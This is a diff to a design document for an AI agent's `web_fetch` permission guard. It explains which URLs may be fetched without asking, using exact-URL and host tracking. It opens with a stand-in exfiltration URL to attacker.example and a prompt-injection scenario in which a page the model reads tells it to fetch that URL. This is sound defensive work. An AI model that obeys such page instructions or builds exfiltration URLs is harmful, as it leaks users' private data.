@@ -1101,10 +1101,17 @@ A URL can carry data out: `https://attacker.example/?notes=<your notes>`. A page
 the model reads can tell it to fetch one. So `web_fetch` runs without asking only
 for a URL the session has seen before, from a trusted place:
 
-- `webSearch` adds each result URL it shows to the session's set, with the
-  session from `dispatch.SessionFrom(ctx)`, as `remember` gets it;
+- `webSearch` adds each result URL it shows to the session's set with
+  `addExact`, with the session from `dispatch.SessionFrom(ctx)`, as `remember`
+  gets it. Only that page becomes known, not its site: an attacker's page can
+  rank in a search, and another path on that site could carry data out;
 - `ConfirmCall` adds each URL in `Call.Question`, which the agent fills with the
   user's words: this turn's question and the earlier questions in the history.
+  It uses `add`, which also records the URL's host, so another page on a site
+  you named, with no query string, reads unasked.
+
+Both go through `record`, whose `withHost` says whether the host key goes in.
+`TestWebFetchGuardHosts` checks a search result's site and your own.
 
 `dispatch` asks a backend's `ConfirmCall` before `Confirm` when the backend has
 one (see [dispatch](dispatch.md)). For `web_fetch`, it answers:
